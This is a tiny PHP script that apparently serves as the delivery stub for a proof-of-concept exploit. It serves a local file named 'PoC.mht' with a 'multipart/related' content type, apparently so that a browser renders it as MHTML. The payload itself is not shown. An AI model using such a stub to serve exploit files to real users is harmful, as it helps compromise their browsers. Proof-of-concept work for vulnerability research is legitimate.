<?php
$filename=realpath("PoC.mht");
header( "Content-type: multipart/related");
readfile($filename);
?>
